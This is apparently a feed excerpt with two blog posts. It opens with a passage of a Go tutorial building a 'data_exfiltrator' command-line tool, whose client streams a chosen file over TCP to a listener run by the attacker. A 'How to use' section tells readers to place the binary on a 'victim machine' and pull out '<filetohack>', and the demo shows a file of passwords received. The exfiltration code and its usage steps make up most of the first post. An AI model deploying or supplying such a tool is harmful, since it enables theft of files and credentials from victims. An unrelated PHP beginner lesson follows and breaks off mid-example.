&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package client

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

const connType = "tcp"

func checkFile(file string) error {
    _, err := os.Stat(file)
    return err
    // check file permissions as well
}

func ExfiltrateFile(fileName, connHost, connPort string) error {

    // stat file
    if checkFile(fileName) != nil {
        return fmt.Errorf("FileNotFound: Not able to find the file %s", fileName)
    }

    // check connection

    fmt.Printf("Connecting %s:%s over %s\n", connHost, connPort, connType)
    conn, err := net.Dial(connType, connHost+":"+connPort)
    if err != nil {
        fmt.Println(err.Error())
        return fmt.Errorf("HostNotReachable: Not able to connect %s:%s", connHost, connPort)
    }
    defer conn.Close()
    //transfer file
    file, err := os.Open(fileName)
    if err != nil {
        return fmt.Errorf("FilePermission: Not able to read file %s", fileName)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        var b = make([]byte, 2, 3)

        // We add \n because scanner.Text() removes the ending newline character
        conn.Write([]byte(scanner.Text() + "\n"))

        // Wait for the server message to indicate that the line is written
        conn.Read(b)
    }
    return nil
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As we notice in the above file we don't have main function, rather we are using &lt;code&gt;ExfiltrateFile&lt;/code&gt; as the function which takes &lt;code&gt;fileName&lt;/code&gt; , &lt;code&gt;connHost&lt;/code&gt; and &lt;code&gt;connPort&lt;/code&gt; as arguments. &lt;/p&gt;

&lt;p&gt;Now try to understand what we are doing here. We will pass option from the shell to accept file names, host and port. They will be passed in the &lt;code&gt;root.go&lt;/code&gt;. &lt;code&gt;root.go&lt;/code&gt; will determine what subcommand we are using, &lt;code&gt;client&lt;/code&gt; or &lt;code&gt;server&lt;/code&gt; by the command we have typed. Suppose if we are running &lt;code&gt;client&lt;/code&gt; sub-command then &lt;code&gt;cmd/client.go&lt;/code&gt; will be invoked with the appropriate flags (file names, host and port passed from shell). Once &lt;code&gt;cmd/client.go&lt;/code&gt; get these flags, it will call &lt;code&gt;ExfiltrateFile()&lt;/code&gt; function from &lt;code&gt;client/client.go&lt;/code&gt; and pass these flags as arguments. The &lt;code&gt;ExfiltrateFile()&lt;/code&gt; function will run the the client logic we built earlier. &lt;/p&gt;

&lt;p&gt;This also goes for &lt;code&gt;server/server.go&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package server

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

const (
    connType = "tcp"
)

func Serve(fileName, connHost, connPort string) error {

    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)
    conn, err := net.Listen(connType, connHost+":"+connPort)
    if err != nil {
        return fmt.Errorf("ConnectionError: Not able to connect %s", connHost+":"+connPort)
    }
    defer conn.Close()

    // running the loop for listening all the connections
    fmt.Println("Listening ... ")
    for {
        // Start accepting the connections
        client, err := conn.Accept()
        if err != nil {
            panic(err.Error())
        }
        fmt.Println("Client", client.RemoteAddr().String(), "connected")
        go handleClientConnection(client, fileName)
        fmt.Println("You can press Ctrl+c to terminate the program")
    }
}

func handleClientConnection(conn net.Conn, fileName string) {
    // handling buffer writes
    // it take the connection and then creates the buffer
    file, err := os.Create(fileName)
    if err != nil {
        panic(err)
    }
    defer close(file)
    for {
        buffer, err := bufio.NewReader(conn).ReadBytes('\n')
        if err != nil {
            fmt.Println("Client left")
            conn.Close()
            return
        }
        file.WriteString(string(buffer[:]))

        // Sending a reply back to client for synchronous connection
        conn.Write([]byte("Y\n"))
    }

}
func close(file *os.File) {
    fmt.Println("Closing the file")
    fmt.Println()
    fmt.Println("Listening ... (press Ctrl+c to terminate)")
    file.Close()
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we use the &lt;code&gt;Serve&lt;/code&gt; function to start a TCP server by accepting file name, host and port as parameters&lt;/p&gt;

&lt;p&gt;If we carefully observe the &lt;code&gt;handleConnection&lt;/code&gt; function then we are now outputting everything to a file and not to the console. This file name is received from the &lt;code&gt;--output&lt;/code&gt; or &lt;code&gt;-o&lt;/code&gt; option in the &lt;code&gt;cmd/server.go&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Now our client and server logic is ready to be used. We just need to modify the &lt;code&gt;cmd/client.go&lt;/code&gt; and &lt;code&gt;cmd/server.go&lt;/code&gt; to pass the flags to the &lt;code&gt;client&lt;/code&gt; and &lt;code&gt;server&lt;/code&gt; accordingly.&lt;br&gt;
So the &lt;code&gt;cmd/client.go&lt;/code&gt; is&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package cmd

import (
    "log"

    "github.com/dunefro/data_exfiltrator/client"
    "github.com/spf13/cobra"
)

// clientCmd represents the client command
var clientCmd = &amp;amp;cobra.Command{
    Use:   "client",
    Short: "to run the client",
    Long:  `Running the client for data exfiltrator`,
    Run: func(cmd *cobra.Command, args []string) {

        fileName, _ := cmd.Flags().GetString("file")
        host, _ := cmd.Flags().GetString("host")
        port, _ := cmd.Flags().GetString("port")

        err := client.ExfiltrateFile(fileName, host, port)
        if err != nil {
            log.Println("Failed to transfer the file")
            log.Fatal(err.Error())
        } else {
            log.Println("Successful: File was transferred")
        }

    },
}

func init() {
    rootCmd.AddCommand(clientCmd)

    // defining flags for client
    clientCmd.PersistentFlags().StringP("file", "f", "", "file(text) name which you want to transfer (required)")
    clientCmd.MarkPersistentFlagRequired("file")
    clientCmd.PersistentFlags().StringP("host", "", "127.0.0.1", "host that you wish to connect")
    clientCmd.PersistentFlags().StringP("port", "p", "8080", "port that you wish to connect")

}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the &lt;code&gt;init()&lt;/code&gt; function we have flags that are available with the &lt;code&gt;client&lt;/code&gt; sub-command. These are &lt;code&gt;file&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt; and &lt;code&gt;port&lt;/code&gt; which can be invoked with &lt;code&gt;--&lt;/code&gt; for shell arguments. We have only marked one of the options as mandatory with &lt;code&gt;client&lt;/code&gt; sub-command i.e. &lt;code&gt;file&lt;/code&gt;. Logically the client must pass some file to exfiltrate. If &lt;code&gt;host&lt;/code&gt; and &lt;code&gt;port&lt;/code&gt; are not specified then we will use default value &lt;code&gt;127.0.0.1&lt;/code&gt; and &lt;code&gt;8080&lt;/code&gt;. This is mentioned in the 3rd argument of each flag. We can use the small option &lt;code&gt;p&lt;/code&gt; for port as &lt;code&gt;-p&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once this is initialized the function in the &lt;code&gt;Run&lt;/code&gt; will be executed and we can get all the values passed for each argument in the command invoked by using &lt;code&gt;cmd.Flags()&lt;/code&gt;. So&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;fileName, _ := cmd.Flags().GetString("file")
host, _ := cmd.Flags().GetString("host")
port, _ := cmd.Flags().GetString("port")
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This gives the value of &lt;code&gt;fileName&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt; and &lt;code&gt;port&lt;/code&gt; passed in the command. Once we have them we invoke the &lt;code&gt;ExfiltrateFile()&lt;/code&gt; function from the &lt;code&gt;client/client.go&lt;/code&gt; which we have imported in the &lt;code&gt;cmd/client.go&lt;/code&gt; by&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;"example.com/data_exfiltrator/client"
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and so now to call the exfiltrate function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;client.ExfiltrateFile(fileName, host, port)
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This happens for &lt;code&gt;server.go&lt;/code&gt; as well&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package cmd

import (
    "fmt"

    "example.com/data_exfiltrator/server"
    "github.com/spf13/cobra"
)

// serverCmd represents the server command
var serverCmd = &amp;amp;cobra.Command{
    Use:   "server",
    Short: "creating server",
    Long:  `This will create a server at a specified port for connection and output to directed file`,
    Run: func(cmd *cobra.Command, args []string) {
        fileName, _ := cmd.Flags().GetString("output")
        host, _ := cmd.Flags().GetString("host")
        port, _ := cmd.Flags().GetString("port")

        err := server.Serve(fileName, host, port)
        if err != nil {
            fmt.Println(err.Error())
        }
    },
}

func init() {
    rootCmd.AddCommand(serverCmd)

    // defining flags
    serverCmd.PersistentFlags().StringP("output", "o", "", "output(text file) to transfer the data (required)")
    serverCmd.MarkPersistentFlagRequired("output")
    serverCmd.PersistentFlags().StringP("host", "", "127.0.0.1", "host that you wish to connect")
    serverCmd.PersistentFlags().StringP("port", "p", "8080", "port that you wish to connect")
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For the &lt;code&gt;serve&lt;/code&gt; sub-command we are using &lt;code&gt;output&lt;/code&gt; as the option for outputting what we receive from the client. This is a compulsory option and must be passed when invoking &lt;code&gt;server&lt;/code&gt; sub-command. We have &lt;code&gt;host&lt;/code&gt; and &lt;code&gt;port&lt;/code&gt; similar to &lt;code&gt;client&lt;/code&gt; sub-command. We call the server function by -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;server.Serve(fileName, host, port)
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and pass the output file, host and port.&lt;/p&gt;

&lt;p&gt;Finally the &lt;code&gt;root.go&lt;/code&gt; will be&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package cmd

import (
    "os"

    "github.com/spf13/cobra"
)

// rootCmd represents the base command when called without any subcommands
var rootCmd = &amp;amp;cobra.Command{
    Use:   "data_exfiltrator [command]",
    Short: "Exfiltrate your files from one location to another",
    Long:  `Application to build data exfiltrator`,
    // Uncomment the following line if your bare application
    // has an action associated with it:
    // Run: func(cmd *cobra.Command, args []string) { },
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
    err := rootCmd.Execute()
    if err != nil {
        os.Exit(1)
    }
}

func init() {
    // Here you will define your flags and configuration settings.
    // Cobra supports persistent flags, which, if defined here,
    // will be global for your application.

    // rootCmd.PersistentFlags().StringVar(&amp;amp;cfgFile, "config", "", "config file (default is $HOME/.data_exfiltrator.yaml)")

    // Cobra also supports local flags, which will only run
    // when this action is called directly.
    // rootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
    // Add version here
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For &lt;code&gt;root.go&lt;/code&gt; we have disabled the &lt;code&gt;Run&lt;/code&gt; flag to hold any function. This is because we don't want to do anything until a sub-command like &lt;code&gt;client&lt;/code&gt; or &lt;code&gt;server&lt;/code&gt; is passed to it.&lt;/p&gt;

&lt;p&gt;So now we will build everything and test. To build&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go build
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will create a binary called &lt;code&gt;data_exfiltrator&lt;/code&gt;. Run this binary simply by&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator                                               
Application to build data exfiltrator

Usage:
  data_exfiltrator [command]

Available Commands:
  client      to run the client
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  server      creating server

Flags:
  -h, --help   help for data_exfiltrator

Use "data_exfiltrator [command] --help" for more information about a command.
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We will try to run a server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator server -o something.txt  --host 192.168.56.178 --port 8080
Starting tcp server on 192.168.56.178:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now we will try to run the client&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator client
Error: required flag(s) "file" not set
Usage:
  data_exfiltrator client [flags]

Flags:
  -f, --file string   file(text) name which you want to transfer (required)
  -h, --help          help for client
      --host string   host that you wish to connect (default "127.0.0.1")
  -p, --port string   port that you wish to connect (default "8080")
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will fail because as we have mentioned we need to pass the option &lt;code&gt;--file&lt;/code&gt; for this, so&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator client -f client/sample_input.txt --host 192.168.56.178 --port 8080
Connecting 192.168.56.178:8080 over tcp
2022/01/23 22:43:27 Successful: File was transferred
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The terminal 1 where server ran is now showing&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator server -o something.txt  --host 192.168.56.178 --port 8080
Starting tcp server on 192.168.56.178:8080
Listening ... 
Client 192.168.56.178:34154 connected
You can press Ctrl+c to terminate the program
Client left
Closing the file

Listening ... (press Ctrl+c to terminate)
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Press Ctrl+C to check the file &lt;code&gt;something.txt&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cat something.txt         
password1
password2
password3
password4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The file is &lt;strong&gt;exfiltrated&lt;/strong&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#making-it-windows-and-linux-suitable"&gt;
  &lt;/a&gt;
  Making it Windows and Linux suitable
&lt;/h3&gt;

&lt;p&gt;During exfiltration my main issue was that I was not able to run some program on windows which I was easily able to run on Linux. As Golang provides us with this ability I built the same binary for windows as well. &lt;/p&gt;

&lt;p&gt;Let's check how to do that - &lt;br&gt;
To make the file windows specific&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ GOOS=windows GOARCH=amd64 go build .
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will create a file called &lt;code&gt;data_exfiltrator.exe&lt;/code&gt; which you can now run on windows.&lt;/p&gt;

&lt;p&gt;Generally the scenario is to hack files from windows and hackers have Linux as their own host. That's why having &lt;code&gt;data_exfiltrator.exe&lt;/code&gt; and &lt;code&gt;data_exfiltrator&lt;/code&gt; will be very helpful because we can now mix and match the use cases to a wide range.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#how-to-use-the-above-file"&gt;
  &lt;/a&gt;
  How to use the above file
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Once you have built the binary, go over to the victim machine, and keep this binary over there. if it's windows then copy the windows binary for the same.&lt;/li&gt;
&lt;li&gt;On your local machine run the server by &lt;code&gt;./data_exfiltrator server --ouput &amp;lt;outputfile&amp;gt; --host &amp;lt;yourIP&amp;gt; --port &amp;lt;yourPort&amp;gt;&lt;/code&gt; command. If you local is also  windows then run &lt;code&gt;./data_exilftrator.exe server&lt;/code&gt; with similar flags.&lt;/li&gt;
&lt;li&gt;Now on the victim side run &lt;code&gt;./data_exfiltrator.exe client -f &amp;lt;filetohack&amp;gt; --host &amp;lt;serverhost&amp;gt; --port &amp;lt;serverport&amp;gt;&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;You will get the &lt;code&gt;&amp;lt;filetohack&amp;gt;&lt;/code&gt; file in your local with the name &lt;code&gt;&amp;lt;outputfile&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;The above program if read in a single take might become a nightmare to perform that's why I made it a point to distribute it in lot of small chunks. The main takeaway is to understand the logic of socket programming and how to create a CLI application in Golang.&lt;br&gt;
To get the complete source code you can refer to &lt;a href="https://github.com/dunefro/data_exfiltrator"&gt;GITHUB&lt;/a&gt;. Let me know what do you think about this.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#references"&gt;
  &lt;/a&gt;
  References
&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://blog.knoldus.com/create-kubectl-like-cli-with-go-and-cobra/"&gt;https://blog.knoldus.com/create-kubectl-like-cli-with-go-and-cobra/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dev.to/aurelievache/learning-go-by-examples-part-3-create-a-cli-app-in-go-1h43"&gt;https://dev.to/aurelievache/learning-go-by-examples-part-3-create-a-cli-app-in-go-1h43&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/spf13/cobra"&gt;https://github.com/spf13/cobra&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

</description>
      <category>go</category>
      <category>programming</category>
      <category>cybersecurity</category>
    </item>
    <item>
      <title>PHP crash course : Conditionals, Loops and Functions</title>
      <author>Eric The Coder</author>
      <pubDate>Sun, 23 Jan 2022 18:02:50 +0000</pubDate>
      <link>https://dev.to/ericchapman/php-crash-course-conditionals-loops-and-functions-ck6</link>
      <guid>https://dev.to/ericchapman/php-crash-course-conditionals-loops-and-functions-ck6</guid>
      <description>&lt;p&gt;Today you will learn conditionals, loops and functions création in PHP.&lt;/p&gt;

&lt;p&gt;This PHP crash course is free and will be posted here on dev.to. I'll be releasing a new article/post every two days or so. To not miss anything, you can follow me on twitter: &lt;a href="https://twitter.com/EricTheCoder_"&gt;Follow @EricTheCoder_&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#conditional-execution"&gt;
  &lt;/a&gt;
  Conditional execution
&lt;/h1&gt;

&lt;p&gt;In PHP, it is possible to execute a line of code only if a condition is true&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The code enclosed in the parentheses is called an expression. PHP will execute this code and return its boolean value (true or false).&lt;/p&gt;

&lt;p&gt;If the result is 'true' then the code contained between the { } will be executed.&lt;/p&gt;

&lt;p&gt;If the result is false, nothing will be executed in this if block&lt;/p&gt;

&lt;p&gt;Here is another example with the operator greater than « &amp;gt; »&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Free shipping'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the expression ($amount) will return true, so shipping will be free.&lt;/p&gt;

&lt;p&gt;It is possible to execute code if the condition is false&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Free shipping'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Shipping 9.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the keyword else executes the code if the expression is 'false'&lt;/p&gt;

&lt;p&gt;Finally, it is possible to have several conditions&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Free shipping'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Shipping 9.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Shipping 19.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The elseif keyword is used to test another condition. Note that this condition will be tested only if the first condition is false.&lt;/p&gt;

&lt;p&gt;If both the first and the second condition are false, then the code in the else section will be executed.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#comparison-operator"&gt;
  &lt;/a&gt;
  Comparison operator
&lt;/h3&gt;

&lt;p&gt;Here are the different operators that can be used in expressions.&lt;/p&gt;

&lt;p&gt;==   equal no type check&lt;br&gt;
===  equal with type check&lt;br&gt;
!=   not equal&lt;br&gt;
||   or&lt;br&gt;
&amp;amp;&amp;amp;   and&lt;br&gt;
&amp;gt;   greater than&lt;br&gt;
&amp;lt;   less than&lt;/p&gt;

&lt;p&gt;it is possible to test several expressions at the same time with the operator &amp;amp;&amp;amp;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The price is between 1 and 49'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The same principle applies for the operator or ||&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The price is 100$ or 200$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Expressions without a comparison operator&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The price is not zéro'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the expression ($amount) does not contain a comparison operator, despite this fact, this code is valid. Why ? In PHP each expression is converted into a Boolean value. So here 0 is converted to false. Any other value other than zero (or null) would convert to true.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conversion-to-boolean-value"&gt;
  &lt;/a&gt;
  Conversion to boolean value
&lt;/h3&gt;

&lt;p&gt;Here is the list of values that will be converted to false &lt;/p&gt;

&lt;p&gt;false&lt;/p&gt;

&lt;p&gt;0&lt;/p&gt;

&lt;p&gt;0.0&lt;/p&gt;

&lt;p&gt;null&lt;/p&gt;

&lt;p&gt;‘0’ (string equal to zero)&lt;/p&gt;

&lt;p&gt;‘ ’ (empty string)&lt;/p&gt;

&lt;p&gt;&lt;a href="https://dev.toempty%20array"&gt; &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;All other values will convert to true&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#here-are-some-examples-of-conversion-to-boolean-value"&gt;
  &lt;/a&gt;
  Here are some examples of conversion to boolean value
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$messsage&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'Hello World'&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// true&lt;/span&gt;
